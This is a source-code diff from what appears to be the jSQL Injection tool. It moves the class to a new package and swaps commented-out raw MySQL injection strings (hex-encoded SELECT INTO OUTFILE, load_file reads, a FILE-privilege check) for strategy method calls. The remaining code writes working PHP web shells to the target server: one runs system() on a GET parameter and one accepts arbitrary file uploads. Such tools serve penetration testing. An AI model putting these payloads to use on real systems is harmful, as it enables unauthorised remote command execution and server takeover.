@@ -8,7 +8,7 @@
  * Contributors:
  *      ron190 at ymail dot com - initial implementation
  ******************************************************************************/
-package com.jsql.model.access.object;
+package com.jsql.model.accessible;
 
 import java.io.BufferedReader;
 import java.io.File;
@@ -170,17 +170,11 @@ public class RessourceAccessObject {
         }
 
         MediatorModel.model().inject(
-//            MediatorModel.model().initialQuery.replaceAll(
-//                "1337" + MediatorModel.model().visibleIndex + "7331",
-//                "(select+0x" + ToolsString.strhex("<SQLi><?php system($_GET['c']); ?><iLQS>") + ")"
-//            ).replaceAll("--++", "")
-//            + "+into+outfile+\"" + path + WEBSHELL_FILENAME + "\"--+"
             MediatorModel.model().sqlStrategy.writeTextFile("<SQLi><?php system($_GET['c']); ?><iLQS>", path + WEBSHELL_FILENAME)
         );
 
         String[] sourcePage = {""};
         String hexResult = new StoppableLoopIntoResults().action(
-//                "concat(hex(load_file(0x" + ToolsString.strhex(path + WEBSHELL_FILENAME) + ")),0x69)",
                 MediatorModel.model().sqlStrategy.readTextFile(path + WEBSHELL_FILENAME),
                 sourcePage,
                 false,
@@ -225,17 +219,11 @@ public class RessourceAccessObject {
         String phpShell = "<?php echo move_uploaded_file($_FILES['u']['tmp_name'], getcwd().'/'.basename($_FILES['u']['name']))?'SQLiy':'n'; ?>";
 
         MediatorModel.model().inject(
-//                MediatorModel.model().initialQuery.replaceAll(
-//                        "1337" + MediatorModel.model().visibleIndex + "7331",
-//                        "(select+0x" + ToolsString.strhex("<SQLi>" + phpShell + "<iLQS>") + ")"
-//                ).replaceAll("--++", "")
-//                + "+into+outfile+\"" + path + UPLOAD_FILENAME + "\"--+"
                 MediatorModel.model().sqlStrategy.writeTextFile("<SQLi>" + phpShell + "<iLQS>", path + UPLOAD_FILENAME)
         );
 
         String[] sourcePage = {""};
         String hexResult = new StoppableLoopIntoResults().action(
-//                "concat(hex(load_file(0x" + ToolsString.strhex(path + UPLOAD_FILENAME) + ")),0x69)",
                 MediatorModel.model().sqlStrategy.readTextFile(path + UPLOAD_FILENAME),
                 sourcePage,
                 false,
@@ -364,8 +352,6 @@ public class RessourceAccessObject {
         String[] sourcePage = {""};
 
         String hexResult = new StoppableLoopIntoResults().action(
-//                "concat((select+hex(if(count(*)=1,0x" + ToolsString.strhex("true") + ",0x" + ToolsString.strhex("false") +
-//                "))from+INFORMATION_SCHEMA.USER_PRIVILEGES+where+grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)and+PRIVILEGE_TYPE=0x46494c45),0x69)",
                 MediatorModel.model().sqlStrategy.getPrivilege(),
                 sourcePage,
                 false,
@@ -534,17 +520,11 @@ public class RessourceAccessObject {
                 " ?><iLQS>";
 
         MediatorModel.model().inject(
-//                MediatorModel.model().initialQuery.replaceAll(
-//                    "1337" + MediatorModel.model().visibleIndex + "7331",
-//                    "(select+0x" + ToolsString.strhex(s) + ")"
-//                ).replaceAll("--++", "") +
-//                "+into+outfile+\"" + path + SQLSHELL_FILENAME + "\"--+"
                 MediatorModel.model().sqlStrategy.writeTextFile(s, path + SQLSHELL_FILENAME)
         );
 
         String[] sourcePage = {""};
         String hexResult = new StoppableLoopIntoResults().action(
-//                "concat(hex(load_file(0x" + ToolsString.strhex(path + SQLSHELL_FILENAME) + ")),0x69)",
                 MediatorModel.model().sqlStrategy.readTextFile(path + SQLSHELL_FILENAME),
                 sourcePage,
                 false,
